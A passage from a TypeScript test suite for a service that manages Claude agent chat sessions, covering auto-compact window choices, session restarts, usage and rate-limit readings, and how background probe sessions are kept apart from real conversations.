      await service.refreshSubscriptionUsage()
      await letGo()

      await expect(service.refreshSubscriptionUsage()).resolves.toMatchObject({ kind: 'read' })
      expect(agents).toHaveLength(1)

      await expect(service.refreshSubscriptionUsage(true)).resolves.toMatchObject({ kind: 'read' })
      expect(agents).toHaveLength(2)
    })
  })

  describe('where a conversation compacts', () => {
    /** Sends one message and lets its turn finish, leaving a session with history. */
    async function idleAfterOneTurn(): Promise<{
      service: OctopusService
      workspaceId: string
      chatId: string
    }> {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      agent().emit(initMessage)
      agent().emit(resultMessage)

      await vi.waitFor(() => {
        const [record] = service.listChats(workspaceId)
        expect(record?.sessionId).toBe('sess-1')
        expect(record?.status).toBe('idle')
      })
      return { service, workspaceId, chatId: chat.id }
    }

    it('starts the session with the chosen window', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await service.setChatAutoCompact(chat.id, 500_000)
      // Stored, and nothing started for it: a choice is not a reason to spawn.
      expect(agents).toHaveLength(0)
      expect(service.listChats(workspaceId)[0]?.autoCompactWindow).toBe(500_000)

      await service.sendToChat(chat.id, 'work')
      expect(agent().options().settings).toMatchObject({ autoCompactWindow: 500_000 })
    })

    // Null defers to the agent — its own default, or what `/autocompact`
    // saved. Sent as anything at all, the flag layer would outrank that.
    it('says nothing about the window when none is chosen', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      expect(agent().options().settings).not.toHaveProperty('autoCompactWindow')
    })

    it('starts an idle conversation again, carrying its history, so the window applies', async () => {
      const { service, chatId } = await idleAfterOneTurn()

      await service.setChatAutoCompact(chatId, 400_000)

      expect(agents).toHaveLength(2)
      expect(agents[0]?.closed()).toBe(1)
      expect(agents[1]?.options().resume).toBe('sess-1')
      expect(agents[1]?.options().settings).toMatchObject({ autoCompactWindow: 400_000 })
      await expect(service.sessionUsage(chatId)).resolves.toMatchObject({
        autoCompact: { chosen: 400_000, pending: false }
      })
    })

    it('starts nothing again when the window has not changed', async () => {
      const { service, chatId } = await idleAfterOneTurn()

      await service.setChatAutoCompact(chatId, null)

      expect(agents).toHaveLength(1)
      expect(agents[0]?.closed()).toBe(0)
    })

    /*
     * Mid-turn the process holds the turn and anything queued behind it, and
     * closing it would lose both. The choice waits, says so, and is applied
     * before the next message goes out — the first moment nothing is in flight.
     */
    it('waits for the turn to end, then applies the window before the next message', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      agent().emit(initMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('running')
      })

      await service.setChatAutoCompact(chat.id, 600_000)

      expect(agents).toHaveLength(1)
      expect(agents[0]?.closed()).toBe(0)
      await expect(service.sessionUsage(chat.id)).resolves.toMatchObject({
        autoCompact: { chosen: 600_000, pending: true }
      })

      agents[0]?.emit(resultMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })
      await service.sendToChat(chat.id, 'more')

      expect(agents).toHaveLength(2)
      expect(agents[0]?.closed()).toBe(1)
      expect(agents[1]?.options().settings).toMatchObject({ autoCompactWindow: 600_000 })
      // The message went to the new session, not the one being closed.
      expect(agents[0]?.sent).toEqual(['work'])
      expect(agents[1]?.sent).toEqual(['more'])
    })

    // The message that applies the window can be `/clear`. Marked before the
    // restart, the request went with the old session, and the clear asked for
    // came back as one nobody asked for.
    it('honours a /clear that is also the message the window waited for', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      agent().emit(initMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('running')
      })
      await service.setChatAutoCompact(chat.id, 600_000)
      agents[0]?.emit(resultMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })

      await service.sendToChat(chat.id, '/clear')
      expect(agents).toHaveLength(2)
      agents[1]?.emit({
        type: 'conversation_reset',
        new_conversation_id: 'conv-2',
        session_id: 'sess-1'
      } as unknown as SDKMessage)

      await vi.waitFor(() => {
        expect(events.map((announced) => announced.event)).toContainEqual({
          type: 'conversation_reset',
          cleared: true
        })
      })
    })

    it('says who outranks the choice, asked of the files the session reads', async () => {
      const asked: { cwd: string; sources: readonly string[] }[] = []
      const { service, workspaceId } = await withWorkspace({
        windowOverride: (cwd, sources) => {
          asked.push({ cwd, sources })
          return Promise.resolve({ value: '450000', from: '~/.claude/settings.json' })
        }
      })
      const chat = await service.openChat(workspaceId)
      await service.setChatAutoCompact(chat.id, 300_000)
      await service.sendToChat(chat.id, 'work')

      await expect(service.sessionUsage(chat.id)).resolves.toMatchObject({
        autoCompact: { override: { value: '450000', from: '~/.claude/settings.json' } }
      })
      // The same sources the session was given, so a file it does not read
      // can never be named as what overrides it.
      const [workspace] = await service.listWorkspaces('planner')
      expect(asked).toEqual([{ cwd: workspace?.path, sources: agent().options().settingSources }])
    })

    /*
     * The default asks the environment and the user's own file. Pointed at a
     * directory this test owns, so the machine's real `~/.claude` is never
     * what decides the answer.
     */
    it('asks the environment when nothing else is given to ask', async () => {
      vi.stubEnv('CLAUDE_CONFIG_DIR', join(dir, 'claude-config'))
      vi.stubEnv('CLAUDE_CODE_AUTO_COMPACT_WINDOW', '450000')
      try {
        const repo = join(dir, 'planner')
        await initRepo(repo)
        agents = []
        const plain = await makeService({
          ...paths(dir),
          query: fakeQuery(),
          listening: () => Promise.resolve(false)
        })
        started.push(plain)
        const project = await plain.addProjectFromPath(repo)
        const workspace = await plain.createWorkspaceIn(project.id)
        const chat = await plain.openChat(workspace.id)
        await plain.sendToChat(chat.id, 'work')

        await expect(plain.sessionUsage(chat.id)).resolves.toMatchObject({
          autoCompact: { override: { value: '450000', from: null } }
        })
      } finally {
        vi.unstubAllEnvs()
      }
    })

    /*
     * A running session does not drop the variable when it is taken out, so
     * only a new session notices. Choosing — the same window included — starts one;
     * a message does not, or a variable left in place would restart the
     * session before every one of them.
     */
    it('looks again for the variable when a window is chosen while it outranks it', async () => {
      let override: { value: string; from: string | null } | null = { value: '450000', from: null }
      const { service, workspaceId } = await withWorkspace({
        windowOverride: () => Promise.resolve(override)
      })
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      agent().emit(initMessage)
      agent().emit(resultMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })

      // Not on a message: the variable is still there, and nothing was chosen.
      await service.sendToChat(chat.id, 'again')
      expect(agents).toHaveLength(1)
      agents[0]?.emit(resultMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })

      override = null
      await service.setChatAutoCompact(chat.id, null)

      expect(agents).toHaveLength(2)
      await expect(service.sessionUsage(chat.id)).resolves.toMatchObject({
        autoCompact: { override: null }
      })
    })

    /*
     * The CLI also takes the variable from a settings file while a session
     * runs, so a start that saw none can be outranked later. The reading then
     * names another window in force, and choosing again starts the session
     * over — the only way to shed a variable it has taken.
     */
    it('starts again when a window is chosen while the reading says another is in force', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatAutoCompact(chat.id, 300_000)
      await service.sendToChat(chat.id, 'work')
      agent().emit(initMessage)
      agent().emit(resultMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })
      contextAnswer = () => Promise.resolve({ ...CONTEXT_RESPONSE, maxTokens: 450_000 })
      await expect(service.sessionUsage(chat.id)).resolves.toMatchObject({
        autoCompact: { chosen: 300_000, effective: 450_000, override: null, pending: false }
      })

      // Not on a message here either: only a choice asks for the files again.
      await service.sendToChat(chat.id, 'again')
      expect(agents).toHaveLength(1)
      agents[0]?.emit(resultMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })

      await service.setChatAutoCompact(chat.id, 300_000)

      expect(agents).toHaveLength(2)
    })

    /*
     * A stray the new session reads again — a model holding less than the
     * choice before any turn has said how much, a managed settings file the
     * start does not read — is one no restart can shed. Started over once to
     * find that out, then left alone: every further choice of the same window
     * would otherwise cost a restart and change nothing.
     */
    it('starts over only once for a stray the new session reads again', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatAutoCompact(chat.id, 300_000)
      await service.sendToChat(chat.id, 'work')
      agent().emit(initMessage)
      agent().emit(resultMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })
      contextAnswer = () => Promise.resolve({ ...CONTEXT_RESPONSE, maxTokens: 450_000 })
      await expect(service.sessionUsage(chat.id)).resolves.toMatchObject({
        autoCompact: { effective: 450_000, settled: false }
      })

      await service.setChatAutoCompact(chat.id, 300_000)
      expect(agents).toHaveLength(2)

      await expect(service.sessionUsage(chat.id)).resolves.toMatchObject({
        autoCompact: { effective: 450_000, settled: true }
      })
      await service.setChatAutoCompact(chat.id, 300_000)

      expect(agents).toHaveLength(2)
    })

    // The restart did shed it: a later stray is a new one, worth a restart.
    it('starts over again for a stray that differs from the one shed', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatAutoCompact(chat.id, 300_000)
      await service.sendToChat(chat.id, 'work')
      agent().emit(initMessage)
      agent().emit(resultMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })
      contextAnswer = () => Promise.resolve({ ...CONTEXT_RESPONSE, maxTokens: 450_000 })
      await service.sessionUsage(chat.id)
      await service.setChatAutoCompact(chat.id, 300_000)

      contextAnswer = () => Promise.resolve({ ...CONTEXT_RESPONSE, maxTokens: 500_000 })
      await expect(service.sessionUsage(chat.id)).resolves.toMatchObject({
        autoCompact: { settled: false }
      })
      await service.setChatAutoCompact(chat.id, 300_000)

      expect(agents).toHaveLength(3)
    })

    /*
     * Measured against the window the session was started with, not the one
     * chosen since: a choice waiting for the turn to end is a reading that
     * differs for a reason already known, and taking it for a stray started
     * the session over when the first window was chosen back.
     */
    it('takes a choice still waiting for its turn for no stray', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatAutoCompact(chat.id, 400_000)
      await service.sendToChat(chat.id, 'work')
      agent().emit(initMessage)
      await service.setChatAutoCompact(chat.id, 300_000)
      contextAnswer = () => Promise.resolve({ ...CONTEXT_RESPONSE, maxTokens: 400_000 })
      await service.sessionUsage(chat.id)
      agent().emit(resultMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })

      await service.setChatAutoCompact(chat.id, 400_000)

      expect(agents).toHaveLength(1)
    })

    // A reading the old session gave after a new one took its place says
    // nothing about the new one.
    it('keeps a reading of a session that has been replaced off the new one', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatAutoCompact(chat.id, 400_000)
      await service.sendToChat(chat.id, 'work')
      agent().emit(initMessage)
      agent().emit(resultMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })
      let answer: (value: unknown) => void = () => undefined
      contextAnswer = () =>
        new Promise((resolve) => {
          answer = resolve
        })
      const reading = service.sessionUsage(chat.id)
      await service.setChatAutoCompact(chat.id, 300_000)
      expect(agents).toHaveLength(2)

      answer({ ...CONTEXT_RESPONSE, maxTokens: 450_000 })
      await reading
      await service.setChatAutoCompact(chat.id, 300_000)

      expect(agents).toHaveLength(2)
    })

    // While the reading agrees with the choice, choosing it again is nothing.
    it('starts nothing again when the reading agrees with the window chosen again', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatAutoCompact(chat.id, 400_000)
      await service.sendToChat(chat.id, 'work')
      agent().emit(initMessage)
      agent().emit(resultMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })
      contextAnswer = () => Promise.resolve({ ...CONTEXT_RESPONSE, maxTokens: 400_000 })
      await service.sessionUsage(chat.id)

      await service.setChatAutoCompact(chat.id, 400_000)

      expect(agents).toHaveLength(1)
    })

    // A reading the agent could not give is no reading, here as for the share.
    it('says nothing about the window when the session cannot say how full it is', async () => {
      contextAnswer = () => Promise.reject(new Error('unknown control request'))
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await expect(service.sessionUsage(chat.id)).resolves.toEqual({
        context: null,
        autoCompact: null
      })
    })

    // An older CLI does not name the model, and then nothing remembered can be
    // looked up for it.
    it('knows nothing of the model when the reading does not name it', async () => {
      contextAnswer = () => Promise.resolve({ ...CONTEXT_RESPONSE, model: undefined })
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await expect(service.sessionUsage(chat.id)).resolves.toMatchObject({
        autoCompact: { modelWindow: null }
      })
    })

    /*
     * The model's own limit is only in a turn's result, and a new session has
     * had none — so what an earlier one learnt is kept, or every restart for a
     * window would blank the hint the menu needs.
     */
    it('remembers what a model holds across the sessions of a conversation', async () => {
      contextAnswer = () => Promise.resolve({ ...CONTEXT_RESPONSE, model: 'claude-haiku-4-5' })
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      agent().emit(initMessage)
      agent().emit({
        ...resultMessage,
        modelUsage: { 'claude-haiku-4-5': { contextWindow: 200_000 } }
      } as unknown as SDKMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })
      await expect(service.sessionUsage(chat.id)).resolves.toMatchObject({
        autoCompact: { modelWindow: 200_000 }
      })

      await service.setChatAutoCompact(chat.id, 300_000)

      expect(agents).toHaveLength(2)
      await expect(service.sessionUsage(chat.id)).resolves.toMatchObject({
        context: { modelWindow: null },
        autoCompact: { modelWindow: 200_000 }
      })
    })
  })

  describe('what a session says about usage', () => {
    it('answers nothing about context before a session exists, and starts none', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await expect(service.sessionUsage(chat.id)).resolves.toEqual({
        context: null,
        autoCompact: null
      })
      expect(agents).toHaveLength(0)
    })

    it('reports the context window once a session is running', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await expect(service.sessionUsage(chat.id)).resolves.toEqual({
        context: {
          percentage: 2,
          usedTokens: 23_921,
          maxTokens: 1_000_000,
          model: 'claude-opus-5[1m]',
          modelWindow: null
        },
        autoCompact: {
          chosen: null,
          effective: 1_000_000,
          modelWindow: null,
          override: null,
          pending: false,
          settled: false
        }
      })
    })

    /*
     * The renderer has two ways in — picking a setting in the composer, and
     * sending a message — and either can be in flight when the other starts.
     * Both used to see no record and both wrote one: the reply and its whole
     * transcript went to the second while `listChats` answered with the first,
     * so the conversation reopened empty and the transcript that had it was
     * filed under an id nothing pointed at.
     */
    it('opens one chat when asked for two at once', async () => {
      const { service, workspaceId } = await withWorkspace()

      const [first, second] = await Promise.all([
        service.openChat(workspaceId),
        service.openChat(workspaceId)
      ])

      expect(first.id).toBe(second.id)
      expect(service.listChats(workspaceId)).toHaveLength(1)
    })

    /*
     * The account's windows used to ride along with this, and no longer do:
     * the composer strip they were drawn in reads only the context share, and
     * has since they moved to the foot of the sidebar. Asking for both here
     * made every pane wait on the slower of two readings to draw one of them.
     */
    it('answers about the context window and nothing else', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      expect(await service.sessionUsage(chat.id)).toEqual({
        context: expect.objectContaining({ percentage: 2 }),
        autoCompact: expect.objectContaining({ effective: 1_000_000 })
      })
    })

    // Blanking the figures because one request was refused would report a
    // change in the account that never happened.
    it('keeps the last good reading when a later one fails', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      await service.refreshSubscriptionUsage()

      usageAnswer = () => Promise.reject(new Error('unknown control request'))
      await service.refreshSubscriptionUsage()

      expect(share(service.getUsageWindows(), 'five_hour')).toBe(18)
    })

    it('refuses a chat that does not exist', async () => {
      const { service } = await withWorkspace()

      await expect(service.sessionUsage('nope')).rejects.toThrow()
    })

    /*
     * This used to assert the opposite — "a reading is a moment, not a record.
     * Nothing about it belongs on disk" — and that was right while the figures
     * were only ever drawn inside a conversation that had just had a turn.
     *
     * They are drawn at the foot of the sidebar now, from the moment the window
     * opens, and they arrive only from a running session's control channel. So
     * without the last one on disk the block is empty on every launch until
     * somebody sends a message, which is the thing it exists to fix. It is the
     * same bargain `knownModels` in the state file already makes, in the same
     * words: remembered so something is usable before the first message.
     */
    it('keeps the account reading, so it survives a restart', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.refreshSubscriptionUsage()

      const stored = JSON.parse(await readFile(join(dir, 'state.json'), 'utf8')) as {
        usageWindows: UsageWindows | null
      }
      expect(share(stored.usageWindows, 'five_hour')).toBe(18)
    })

    // Read up to three times a turn, so a write per read would put the state
    // file under the busiest path in the app to record a number that had not
    // moved.
    /*
     * The session id arrives with every init — every slash command sends one —
     * and a status is set to what it already is several times a turn. Each
     * used to write the whole file to the same bytes; a change that hands the
     * state back as it was writes nothing now. A write is a rename, so the
     * file's inode is what says whether one happened.
     */
    it('writes nothing for a change that changed nothing', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      const session = agent()
      session.emit(initMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.sessionId).toBe('sess-1')
      })
      const { ino: before } = await stat(join(dir, 'state.json'))

      // The same id again, and the status it already has.
      session.emit(initMessage)
      session.emit(lifecycle('m-1', 'started'))
      await new Promise((resolve) => setTimeout(resolve, 50))

      expect((await stat(join(dir, 'state.json'))).ino).toBe(before)

      // And a change that did change something is written, so the file was
      // not simply left alone for every reason.
      await service.setWorkspaceNotes(workspaceId, 'half done')
      expect((await stat(join(dir, 'state.json'))).ino).not.toBe(before)
    })

    it('writes nothing when the reading has not changed', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      await service.refreshSubscriptionUsage()
      const before = await readFile(join(dir, 'state.json'), 'utf8')

      await service.refreshSubscriptionUsage()

      await expect(readFile(join(dir, 'state.json'), 'utf8')).resolves.toBe(before)
    })

    /*
     * Pushed rather than left to be asked for. A window that watched for a
     * finished turn and then read the cache was racing whatever filled it, and
     * drew the previous turn's figure every time.
     */
    it('announces a reading that moved, and stays quiet about one that did not', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      const announced: UsageWindows[] = []
      const stop = service.onUsageWindows((windows) => announced.push(windows))

      await service.refreshSubscriptionUsage()
      expect(share(announced.at(-1) ?? null, 'five_hour')).toBe(18)

      await service.refreshSubscriptionUsage()
      expect(announced).toHaveLength(1)

      stop()
      await service.refreshSubscriptionUsage()
      expect(announced).toHaveLength(1)
    })

    /** The reading out of an outcome, for the tests that are about the figures. */
    const readingOf = (outcome: UsageOutcome): UsageWindows | null =>
      outcome.kind === 'read' ? outcome.windows : null

    it('reads the account on request, through a session already running', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      expect(share(readingOf(await service.refreshSubscriptionUsage()), 'five_hour')).toBe(18)
    })

    /*
     * No session anywhere, so one is started — in a conversation that already
     * exists, because `openChat` is lazy on purpose and a gauge is not a reason
     * to give a workspace nobody has spoken to a record.
     *
     * And **closed again**, which it was not: `startFor` registers into the
     * session map, so every press used to leave an agent running for the rest
     * of the session. On a timer that would be one more each time.
     */
    it('starts a session when none is running, and does not leave it behind', async () => {
      const { service, workspaceId } = await withWorkspace()
      await service.openChat(workspaceId)

      expect(share(readingOf(await service.refreshSubscriptionUsage()), 'five_hour')).toBe(18)
      expect(service.listChats(workspaceId)).toHaveLength(1)
      expect(agents[0]?.closed()).toBe(1)
    })

    /*
     * The probe used to be started through `startFor`, which registers it in
     * the session map under a real chat's id — so a message sent while it was
     * out was handed to the probe, and the probe's `finally` then closed the
     * process answering it. The turn vanished without a word: the message in
     * the log, the tab busy, and no result ever coming.
     *
     * Narrowest on the first send of a run, which is also the one most likely
     * to land on a mount or a focus refresh.
     */
    it('does not close a session a message was sent into', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      const reading = service.refreshSubscriptionUsage()
      await service.sendToChat(chat.id, 'hello')
      await reading

      // The conversation's own session, still alive and still holding what was
      // sent to it — a probe that had been adopted would have taken both.
      expect(agents.at(-1)?.sent).toEqual(['hello'])
      expect(agents.at(-1)?.closed()).toBe(0)
      expect(service.listChats(workspaceId)[0]?.status).toBe('running')
    })

    /*
     * The probe used to run as the conversation. `startFor` wires the ordinary
     * event handler for that chat, resumes its session id and fires the
     * commands and models reads against its record — so a background gauge
     * committed writes to a conversation nobody had spoken in, and a probe
     * whose spawn threw put a red row and a line naming the agent binary into
     * somebody's transcript.
     *
     * `knownCommands` is the visible half of that, and the one a filter on
     * events alone would have left behind.
     */
    it('writes nothing into the conversation it is asked through', async () => {
      offeredCommands = () =>
        Promise.resolve([
          { name: 'deploy', description: '', aliases: [] } as unknown as SlashCommand
        ])
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await service.refreshSubscriptionUsage()

      expect(events).toEqual([])
      expect(service.listChats(workspaceId)[0]?.knownCommands).toEqual([])
      await expect(service.chatHistory(chat.id)).resolves.toEqual([])
      expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
    })

    /*
     * A gauge has nothing to permit, so a probe asked for permission refuses
     * rather than putting a card in front of somebody. It cannot happen while
     * the probe only issues a control request — but the alternative is a
     * dialog attributed to a conversation nobody spoke in, which is the whole
     * shape this fix exists to remove.
     */
    it('grants a probe nothing, rather than asking about it', async () => {
      const { service, workspaceId } = await withWorkspace()
      await service.openChat(workspaceId)

      const reading = service.refreshSubscriptionUsage()
      await vi.waitFor(() => {
        expect(agents).toHaveLength(1)
      })

      await expect(agents[0]?.ask('Bash')).resolves.toMatchObject({ behavior: 'deny' })
      await reading
    })

    /*
     * The same argument for an MCP server's question. Nothing draws for a
     * probe — it exists to read a gauge — so a question from one could only
     * ever be waited on for ever.
     */
    it('turns down a question a probe is asked, rather than holding it open', async () => {
      const { service, workspaceId } = await withWorkspace()
      await service.openChat(workspaceId)

      const reading = service.refreshSubscriptionUsage()
      await vi.waitFor(() => {
        expect(agents).toHaveLength(1)
      })

      await expect(
        agents[0]?.elicit({
          serverName: 'ledger',
          message: 'x',
          requestedSchema: { type: 'object', properties: { token: { type: 'string' } } }
        })
      ).resolves.toMatchObject({ action: 'decline' })
      await reading
    })

    // Four things can ask at once — a finished turn, the window regaining
    // focus, the timer, a press — and each starting its own read would spawn
    // its own CLI to answer the same question.
    it('makes one request of four callers at once', async () => {
      const { service, workspaceId } = await withWorkspace()
      await service.openChat(workspaceId)

      await Promise.all([
        service.refreshSubscriptionUsage(),
        service.refreshSubscriptionUsage(),
        service.refreshSubscriptionUsage(),
        service.refreshSubscriptionUsage()
      ])

      expect(agents).toHaveLength(1)
    })

    // A session runs in a worktree, so an installation with no conversation has
    // nowhere to start one. Said rather than left as a button that does nothing.
    it('says when there is no conversation to ask through', async () => {
      const { service } = await withWorkspace()

      await expect(service.refreshSubscriptionUsage()).resolves.toEqual({
        kind: 'nowhereToAsk'
      })
    })

    /*
     * The read in flight is shared, and was cleared in a `finally` that ran
     * *before* the promise it belonged to had been stored — so an answer that
     * came back without awaiting anything ("nowhere to ask") stayed in the slot
     * for good. Every later read, from a turn ending or a press, was handed that
     * one sentence for the rest of the run, and the block never drew a figure
     * however many conversations were opened afterwards.
     */
    it('reads again once there is somewhere to ask, after finding nowhere', async () => {
      const { service, workspaceId } = await withWorkspace()
      await expect(service.refreshSubscriptionUsage()).resolves.toEqual({ kind: 'nowhereToAsk' })

      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      expect(share(readingOf(await service.refreshSubscriptionUsage()), 'five_hour')).toBe(18)
    })

    /*
     * Which session is asked is not a detail. When the usage endpoint refuses,
     * the CLI answers from the headers of its own last model response — current
     * in a session that has just worked, stale in one that has sat idle. The
     * first one started used to be asked every time, whatever it had been doing.
     */
    it('asks the session that spoke last, not the first one started', async () => {
      const { service, workspaceId } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      const second = await service.createChat(workspaceId)
      await service.sendToChat(first.id, 'a')
      await service.sendToChat(second.id, 'b')

      agents[1]?.emit(textMessage('still going'))
      await vi.waitFor(async () => {
        expect(await service.chatHistory(second.id)).not.toHaveLength(0)
      })

      await service.refreshSubscriptionUsage()

      expect(agents[1]?.usageAsked()).toBe(1)
      expect(agents[0]?.usageAsked()).toBe(0)
    })

    it('follows the conversation as the activity moves', async () => {
      const { service, workspaceId } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      const second = await service.createChat(workspaceId)
      await service.sendToChat(first.id, 'a')
      await service.sendToChat(second.id, 'b')

      agents[1]?.emit(textMessage('one'))
      await vi.waitFor(async () => {
        expect(await service.chatHistory(second.id)).not.toHaveLength(0)
      })
      agents[0]?.emit(textMessage('two'))
      await vi.waitFor(async () => {
        expect(await service.chatHistory(first.id)).not.toHaveLength(0)
      })

      await service.refreshSubscriptionUsage()

      expect(agents[0]?.usageAsked()).toBe(1)
      expect(agents[1]?.usageAsked()).toBe(0)
    })

    /*
     * The answer built from response headers has the two shares and nothing per
     * model. Drawn as it stands it is fresher than anything else available — and
     * it made the Fable bar disappear until the next full read, which looked
     * like the account changing.
     */
    it('keeps the per-model windows when an answer is silent about them', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      usageAnswer = () =>
        Promise.resolve({
          ...USAGE_RESPONSE,
          rate_limits: {
            ...USAGE_RESPONSE.rate_limits,
            model_scoped: [
              { display_name: 'Fable', utilization: 12, resets_at: '2026-08-14T04:00:00Z' }
            ]
          }
        })
      await service.refreshSubscriptionUsage()

      usageAnswer = () =>
        Promise.resolve({
          ...USAGE_RESPONSE,
          rate_limits: {
            five_hour: { utilization: 21, resets_at: '2026-08-12T19:50:00.149775+00:00' },
            seven_day: { utilization: 85, resets_at: '2026-08-12T22:00:00.149796+00:00' }
          }
        })
      await service.refreshSubscriptionUsage()

      expect(
        service.getUsageWindows()?.limits.map((window) => [window.key, window.utilization])
      ).toEqual([
        ['five_hour', 21],
        ['seven_day', 85],
        ['model_scoped', 12]
      ])
    })

    /*
     * The same slot, the other way out. A read that *throws* — a probe that
     * cannot spawn, a state write that fails — has to empty it as well, or one
     * bad moment would leave every later read waiting on a promise that is
     * never going to be replaced.
     */
    it('reads again after a read that threw', async () => {
      let broken = true
      const working = fakeQuery()
      const { service, workspaceId } = await withWorkspace({
        query: (params) => {
          if (broken) throw new Error('spawn failed')
          return working(params)
        }
      })
      await service.openChat(workspaceId)

      await expect(service.refreshSubscriptionUsage()).rejects.toThrow('spawn failed')

      broken = false
      expect(share(readingOf(await service.refreshSubscriptionUsage()), 'five_hour')).toBe(18)
    })

    // The card and the block are kept from one answer, so the one that has no
    // per-model windows has to leave the block's alone there too.
    it('keeps the per-model windows when a typed /usage answers without them', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      usageAnswer = () =>
        Promise.resolve({
          ...USAGE_RESPONSE,
          rate_limits: {
            ...USAGE_RESPONSE.rate_limits,
            model_scoped: [
              { display_name: 'Fable', utilization: 12, resets_at: '2026-08-14T04:00:00Z' }
            ]
          }
        })
      await service.refreshSubscriptionUsage()

      usageAnswer = () => Promise.resolve(USAGE_RESPONSE)
      await service.sendToChat(chat.id, '/usage')

      expect(service.getUsageWindows()?.limits.map((window) => window.key)).toEqual([
        'five_hour',
        'seven_day',
        'model_scoped'
      ])
    })

    /*
     * Two readers of one answer that want different amounts of it. The block
     * draws windows and is asked every few minutes, so it leaves out the scan
     * of local transcripts; the card a typed `/usage` draws is the one place
     * that scan is drawn.
     */
    it('skips the transcript scan for the block and not for a typed /usage', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.refreshSubscriptionUsage()
      await service.sendToChat(chat.id, '/usage')

      expect(agent().usageOptions()).toEqual([{ skipBehaviors: true }, undefined])
    })

    /*
     * The account's endpoint refuses most requests and the CLI then answers from
     * a copy it keeps, without saying so. The copy has a date, and that date is
     * what the figures are as of. Older than a few minutes means no fetch has
     * succeeded since — younger can be live, and says nothing.
     */
    describe('how old the figures are', () => {
      const cliFile = (): string => join(dir, 'cli', '.claude.json')

      const cached = async (ageMs: number): Promise<string> => {
        const at = Date.now() - ageMs
        await mkdir(join(dir, 'cli'), { recursive: true })
        await writeFile(cliFile(), JSON.stringify({ cachedUsageUtilization: { fetchedAtMs: at } }))
        return new Date(at).toISOString()
      }

